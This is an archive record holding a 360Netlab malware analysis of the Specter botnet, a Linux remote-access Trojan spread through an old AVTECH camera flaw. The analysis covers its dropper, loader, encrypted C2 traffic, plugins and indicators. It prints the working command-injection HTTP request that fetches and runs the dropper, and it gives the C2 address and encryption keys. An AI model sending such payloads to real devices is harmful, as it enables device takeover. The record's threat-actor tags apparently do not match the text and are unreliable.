{
    "id": "b5ade391-72ba-4c6c-b75a-d7913755ee16",
    "created_at": "2023-01-12T15:07:22.948738Z",
    "updated_at": "2025-03-27T02:16:59.127799Z",
    "deleted_at": null,
    "sha1_hash": "b454998c9563db21fd4c09e70a687d9dc60d3c84",
    "title": "2020-09-25 - Ghost in action- the Specter botnet",
    "authors": "",
    "file_creation_date": "2022-05-29T00:56:06Z",
    "file_modification_date": "2022-05-29T00:56:06Z",
    "file_size": 818679,
    "plain_text": "# Ghost in action: the Specter botnet\n\n**blog.netlab.360.com/ghost-in-action-the-specter-botnet/**\n\nAlex.Turing September 25, 2020\n\n25 September 2020 / [Botnet](https://blog.netlab.360.com/tag/botnet/)\n\n## Background\n\nOn August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file\n( 22523419f0404d628d02876e69458fbe.css )with 0 VT detection.\n\nWhen we took a close look, we see a new botnet that targets `AVTECH IP Camera / NVR /`\n```\nDVR devices, and it has flexible configuration, highly modular / plugin, and uses TLS,\n\n```\nChaCha20, Lz4 to encrypt and compress network traffic.\n\nThe ELF we captured is Dropper, it releases a loader, and the loader will send encrypted\ntraffic requests various Plugins from C2 to perform different functions. The sample build path\nis `/build/arm-specter-linux-uclibcgnueabi, that is why we named it Specter.`\n\nAt present, Specter has a lot of `unprofessional aspects . For example, it releases two`\nlibraries required by runtime while releasing Loader, but they are all dynamically linked.We\nalso noticed that Plugin does not expand and load directly in memory.The vulnerability being\ntargeted is also quite old, a 5 years old on. On the other hand, this botnet has a good layered\ndesign, complex network communication and some other characteristics，which is obviously\na work of professional. `Professional aspects come with unprofessional aspects,`\nthis contradiction makes us speculate that Specter is in the test development stage. We will\nsee how it goes in the future.\n\n## Overview\n\nSpecter is a remote control Trojan (RAT) for the Linux platform.\n\nIt consists of 3 parts, Dropper, Loader, and Plugin. The main function is determined by\nLoader&Plugin. The main functions of Specter are\n\nFile management\n\nDownload and upload management\n\nShell service\n\nSocket5 Proxy\n\nReport device information\n\n\n-----\n\nExecute the script issued by C2\n\nExecuting C2 to deliver executable files\n\nThe basic process is shown in the figure below:\n\n## Propagation\n\nSpecter spread its Dropper samples throughAVTECH IP Camera / NVR / DVR Devices\nvulnerabilities,The payload being used is as follows:\n```\nGET /cgi-bin/nobody/Search.cgi?\naction=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20\nO%20/tmp/webstatus;chmod%20755%20/tmp/webstatus;/tmp/webstatus;rm%20f%20/tmp/webstatus;)&password=admin HTTP/1.1\nHost: {}:4443\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101\nFirefox/73.0\nAccept-Language: en-US,en;q=0.8,zh-CN;q=0.7,zh;q=0.5,zh-TW;q=0.3,zh-HK;q=0.2\nContent-Type: text/plain; charset=utf-8\n\n## Sample analysis\n\n```\nSpecter's infection process can be divided into 4 stages.，\n\nStage 0: Preliminary stage, spread through vulnerabilities, implant Dropper on the\ndevice\nStage 1: Dropper releases Loader\n\n\n-----\n\nStage 2: Loading stage, Loader loads Plugin\nStage 3: Plugin executes the instructions issued by C2\n\n### Stage1：Stage1: Release stage, Specter_Dropper analysis\n\nThe main function of the dropper is to detect the operating environment, decrypt the Loader,\nconfigure the Config, and finally release and start the Loader.\n\nMD5:a8400c378950084fc8ab80b8bb4e5b18\n\nELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, stripped\n\nPacker:No\n\n**1.1 Decrypt Loader**\n\nDecryption algorithm:XOR byte by byte `0x79, then negate.`\n\nAlong with the loaders, the runtime library, `libc.so.0 and ld-uClibc.so.1 are also`\ndecrypted.Currently these two libraries have no malicious functions, but we speculate that\nfuture versions will hijack some functions of these two libraries to hide the existence of\nSpecter from file, process and networks’ perspectives\n\n**1.2 Configure Config**\n\nLook for the written position mark in the Loader sample `SpctCF, and then write Config at its`\nsubsequent address.。\n\nThe comparison is as follows:\n\n\n-----\n\n**1.3 Release and execute Loader**\n\nRelease Loader to the /tmp/runtimes/hw_ex_watchdog file and run it, and later on delete\nitself to clean up the traces of Dropper。\n\n### Stage2: Loading stage, Specter_Loader analysis\n\nThe main function of Loader is to decrypt Config, obtain C2 from it, establish encrypted\ncommunication with C2, and execute the instructions issued by C2. If there is no Plugin for\nprocessing the corresponding instructions, it will request the required Plugin from C2.\n\nMD5:470a092abd67e25463425b611088b1db\n\nELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared\nlibs), stripped\n\nPacker:No\n\n**2.1 Decrypt Config**\n\nThere are C2, mutex name, nonce and other information in the Config file, ChaCha20\nencryption is used, where the key is `CsFg34HbrJsAx6hjBmxDd7A2Wj0Cz9s\\x00 and the`\nnumber of rounds is `15 .`\n\n\n-----\n\nThe detailed Config structure is shown below:，\n\nTake the Config in the above figure as an example, the nonce (12 bytes) required for\ndecryption is:\n```\nc1 f5 9e 20 7a 35 9d 25 ed 77 bb 70\n\n```\nThe ciphertext is:\n```\n94 69 CA D5 A0 0F 73 A9 BB 05 71 B2 31 1D EF 06 \n1A 2A BC 94 3A A7 4B 72 3A 0C BC 8E BF 57 1E 69 \n88 1B A1 7D FB 79 6C 26 A9 95 EB B1 E9 53 A9 2B \n33 3D A7 F6 D2 07 E4 64 FD 70 81 C2 83 C2 A1 5F \n13 EB 3F 9C 6F CD 03 50 84 C5 5C 9C 31 B1 9F CF \n06 4B 5F 12 E9 C3 39 C3 EE 07 C5 CE E2 C2 58 FA\n6C AA 6D 9B 00 C2 37 3E C2 98 52 47 D4 4D E7\n\n```\nAfter decryption, we get the following plaintext, we can see that C2 is `107.182.186.195`\nand mutex is `fb4mi5a`\n```\n00000000 f4 36 ce 57 b0 46 d2 96 27 1c a6 88 fe 57 e2 22 |ô6ÎW°FÒ.'.¦.þWâ\"|\n00000010 52 34 19 f0 40 4d 62 8d 02 87 6e 69 45 8f be 6a |R4.ð@Mb...niE.¾j|\n00000020 66 62 34 6d 69 35 61 00 01 00 00 00 0f 00 00 00 |fb4mi5a.........|\n00000030 31 30 37 2e 31 38 32 2e 31 38 36 2e 31 39 35 03 |107.182.186.195.|\n00000040 00 00 00 34 34 33 01 00 00 00 01 00 00 00 01 00 |...443..........|\n00000050 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 |................|\n00000060 00 00 01 00 00 00 1e 00 5a 00 14 00 3c 00 00   |........Z...<..|\n\n```\n**2.2 Establish communication with C2**\n\n\n-----\n\nThe communication process can be divided into 4 stages, using TLS, ChaCha20 encryption\nalgorithm, lz4 compression algorithm to ensure the security of data communication.The first\nstage is to establish a TLS connection, the second stage is the process of mutual agreement\nauthentication, the third stage is the Loader reporting device information, and the fourth\nstage executes the C2 issuing instruction process.\n\nTLS communication\n\nIn order to analyze the network traffic, we performed a Man-in-the-middle attack,and can see\nthe result as follows. It can be seen that Specter's network communication packet has a fixed\nformat.\n\nPackets can be divided into four parts, the detailed structure is shown below:，\n\nWhere `Encrypted Payload_info stores the payload verification, length, ID and other`\ninfo. [Encrypted?]Compressed Payload is the payload itself, the payload will only be\ncompressed during the key exchange stage, while in all the other stages it gets both\n\n\n-----\n\nencrypted and compressed.\n\nLet’s take a look at the above figure, the data packet that Bot sends to C2 for secret key\nexchange\n\nThe encryption algorithm used in the first part( ncrypted Payload_info ) is:\n```\nChaCha20\nKey: 36 30 30 64 65 33 31 39 61 32 66 38 31 39 62 34 \n              61 38 35 31 64 32 33 66 63 34 62 33 33 33 33 65\nNonce:  E7 66 29 FB 10 98 F6 5A 80 80 FF 58\n\n```\nThe ciphertext is:\n```\n0F 41 01 FD 8B 75 6C A2 20 31 DC 35 70 D9 4D 3B 8E 53 4D E9\n\n```\nafter decryption:\n```\nC9 3E 00 00 00 00 00 00 00 00 01 00 22 00 00 00 20 00 00 00\n3EC9 ---- CRC16 of Payload\n0001 ---- Cmd Id\n00000022 Compressed Payload length\n00000020 Decomressed Payload length\n\n```\nThe value of `Cmd Id is 1, indicating that it is in the key exchange stage, directly`\ndecompress `[Encrypted?]Compressed Payload and get the key sent by Bot to C2`\n```\n01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10\n11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20\n\n```\nAuthentication\n\nThe protocol authentication process can be divided into two stages, the first stage is the key\nexchange, and the second stage is the mutual recognition of identity.\n\n\n-----\n\nAccording to the data packet decryption process introduced above, we will get.\n\nThe secret key sent by Bot to C2 is:\n```\n01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10\n11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20\n\n```\nThe secret key sent by C2 to Bot is:\n```\n19 F8 7C 62 7B 8D A2 B3 59 FD AE 25 4C 18 F7 33\n96 B5 D9 F5 EC FF C2 07 C3 7C 87 53 AE 60 99 2C\n\n```\nIn the secret key exchange phase, the payload is only compressed without encryption; after\nthe secret key is exchanged, Bot and C2 encrypt and compress the payload with each\nother's secret key.\n\nIt can be solved with the above secret key.\n\nThe authentication information sent by Bot to C2 is:\n```\n00000000: 44 48 6E 37-34 73 64 50-4F 71 6E 53-64 32 35 39 DHn74sdPOqnSd259\n\n```\nThe authentication information sent by C2 to Bot is:\n```\n00000000: 6C 30 53 4F-38 68 46 55-78 62 56 73-64 74 51 34 l0SO8hFUxbVsdtQ4\n\n```\nThis is consistent with the implementation we saw in the sample:\n\n**2.3 Report device information, such as MAC/IP address, system type, etc.**\n\n\n-----\n\n**2.4 Execute the start Plugin command issued by C2**\n\n\n-----\n\nSpecter implements a very flexible plugin management communication mechanism, each\nplugin must implement the following 4 methods,\n\nIf there is no corresponding Plugin currently, a request is made to C2 and finally dynamically\nloaded into Loader `Plugin Slot .`\n\n### Stage3: Specter_Plugin analysis\n\nWhen the bot gets the Plugin issued by C2, it cannot be used directly, because they are\nencrypted and can only be loaded into the Plugin Slot for use after decryption.\n\nDecryption algorithm: XOR `0x7f byte by byte, then negate`\n\nHere are some plugins we captured:\n\n**Shell plugin**\n\n\n-----\n\nPlugin id: 1\n\nc7bf33d159597f55dce31b33a58d52de\n\nELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped\n\nThe main function of Shell plugin is to create SHELL service.\n\n**File plugin**\n\nPlugin id: 2\n\ne67db6449c18b2e552786df7718a33c8\n\nELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped\n\nThe main function of the File plugin is file management. In addition to supporting read, write,\ndelete, and search operations on file directories, it may also download/upload files from a\ndesignated server.\n\n\n-----\n\n**Socket Plugin**\n\n\n-----\n\nPlugin id: 3\n\n45c5e7bcb9987356b53fd9a78543dcda\n\nELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped\n\nThe main function of Socket Plugin is to start Socket5 proxy.\n\n**SSF Plugin**\n\nPlugin id: 5\n\nda0f9a21ae7ee3d15794946ca74a07e3\n\nELF 32-bit LSB shared object, ARM, version 1 (SYSV), stripped\n\nThe main function of SSF Plugin is to download an executable file from a specified server to\na local `/tmp/runtimes/httpd_log_output file, and then execute it.。`\n\n## Suggestions\n\nWe recommend that readers monitor and block Specter related IP, URL and samples.\n\n## 联系我们\n\n\n-----\n\n[Readers are always welcomed to reach us on twitter, WeChat 360Netlab or email to netlab](https://twitter.com/360Netlab)\nat 360 dot cn.\n\n## IoC\n\n**CC**\n```\n107.182.186.195:443 ASN25820|IT7_Networks_Inc\nUnited_States|California|Los_Angeles\n\n```\n**Sample MD5**\n```\n04c7ef9e4197985d31e5d601a9161c5e\n052b6fce24a800259289e2f06163db57\n065d942effb6010bb48f7403d3ad442b\n0d0bf23412bd34c82ab28e67278519bf\n2b89fd69d128c8a28425c512670e531a\n2ed27722e095b1c870fdb10e4990db0f\n42d341d0b76869abc2231c70d0f0ecc9\n5e03c99153ed59546bf60c9f896a30f1\n7377eedb6512743858d52da3cc028a33\n7c59ddc06da158afc8b514a9a81ffd36\na5ded8b31b17c88302882cccc35cc28f\na8400c378950084fc8ab80b8bb4e5b18\na99563e6711990b9b3f542ae146bd01c\nacfa5f547b69bde0bf3f343429594b99\nb79639e2b5d10f92ea44721e155fc09b\nb9ac3d23faba205f74ebd932d8e370d3\nc2126977f9f482f290154ea21719330f\nc33b585a0dfa5fdb70d27a17ace6ba1f\nc51fc1656aa857bb7226e2df969aa72d\ncc1b11c6ac6e5bebc4c0e7502b4e1fcd\ncc27d6141f8c66e520122e8f2292a940\neda6d2b0837b5e78ae1b0b50f85e3321\n\n```\n**Downloader**\n```\nhttp://45.76.70.163:80/style/22523419f0404d628d02876e69458fbe.css\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-25 - Ghost in action- the Specter botnet.pdf"
    ],
    "report_names": [
        "2020-09-25 - Ghost in action- the Specter botnet.pdf"
    ],
    "threat_actors": [
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536042,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653785766,
    "ts_modification_date": 1653785766,
    "files": {
        "pdf": "https://archive.orkl.eu/b454998c9563db21fd4c09e70a687d9dc60d3c84.pdf",
        "text": "https://archive.orkl.eu/b454998c9563db21fd4c09e70a687d9dc60d3c84.txt",
        "img": "https://archive.orkl.eu/b454998c9563db21fd4c09e70a687d9dc60d3c84.jpg"
    }
}